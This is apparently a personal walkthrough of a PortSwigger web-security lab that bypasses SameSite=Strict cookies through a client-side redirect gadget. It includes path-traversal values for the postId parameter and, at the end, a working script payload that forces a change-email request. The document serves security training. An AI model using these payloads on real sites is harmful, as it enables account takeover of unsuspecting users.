# Lab: SameSite Strict bypass via client-side redirect
# https://portswigger.net/web-security/learning-paths/csrf/csrf-bypassing-samesite-restrictions-using-on-site-gadgets/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect#

```bash
# POST /my-account/change-email request and notice that this doesn't contain any unpredictable tokens
# Check POST /login response.

HTTP/2 302 Found
Location: /my-account?id=wiener
Set-Cookie: session=0wygPfGa1ulnKT4LfxGtwOIzNSob8DAg; Secure; HttpOnly; SameSite=Strict
X-Frame-Options: SAMEORIGIN
Content-Length: 0

# There is SameSite=Strict This prevents the browser from including these cookies in cross-site requests. 
```

```bash
# Send a random comment to random product
# Directs us to this type of link

/post/comment/confirmation?postId=4 
```
```bash
# CommentConfirmationRedirect.js handles this let's check it's response

redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}

```

```bash
# Take the url of the confirmation request and change the postId value to random string and visit it.

https://0adc005f04ee6d70808617e500c00084.web-security-academy.net/post/comment/confirmation?postId=abc

# Observe that you initially see the post confirmation page before the client-side JavaScript attempts to redirect you to a path containing your injected string, for example, /post/foo

https://0adc005f04ee6d70808617e500c00084.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account

# This redirected us to my-account. This confirms that you can use the postId parameter to elicit a GET request for an arbitrary endpoint on the target site. 
```
```bash

<script>
    document.location = "https://0adc005f04ee6d70808617e500c00084.web-security-academy.net/post/comment/confirmation?postId=../my-account";
</script>

# Observe that when the client-side redirect takes place, you still end up on your logged-in account page.
# This confirms that the browser included your authenticated session cookie in the second request, even though the initial comment-submission request was initiated from an arbitrary external site.

```

```bash
# send change-email post request to repeater and turn it to get request.
# Change email value and send request.
# We see that we can use that request by simply using get method.
```


```bash

<script>
    document.location = "https://0adc005f04ee6d70808617e500c00084.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=getit@email.com%26submit=1";
</script>
```
